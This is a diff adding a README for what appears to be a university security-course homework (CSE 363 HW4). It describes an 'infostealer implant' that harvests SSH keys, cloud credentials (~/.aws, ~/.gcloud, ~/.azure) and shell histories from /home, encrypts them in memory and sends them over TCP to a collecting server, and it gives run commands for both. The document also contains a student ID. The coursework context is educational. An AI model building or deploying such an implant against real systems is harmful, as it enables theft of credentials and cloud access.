@@ -1,0 +1,23 @@
+CSE 363 HW4 - Infostealer Implant
+SBUID: 115201424
+
+DESCRIPTION
+tmp363.py   
+Malware implant. Scans /home/ for sensitive files, archives and
+encrypts them in memory, exfiltrates to server over TCP.
+server363.py 
+Receiving server. Decrypts and extracts received data into a
+timestamped subdirectory per victim.
+
+DEPENDENCIES
+sudo apt install python3-cryptography
+
+DESIGN CHOICES
+- AES-256 CBC with PKCS7 padding for encryption
+- In-memory ZIP using BytesIO (no disk writes on implant)
+- Plain TCP with 4-byte length header
+- Targets: ~/.ssh/, ~/.config/, ~/.aws/, ~/.gcloud/, ~/.azure/, ~/.*_history
+
+USAGE
+- python3 server363.py 127.0.0.1 1234
+- sudo python3 tmp363.py 127.0.0.1 1234
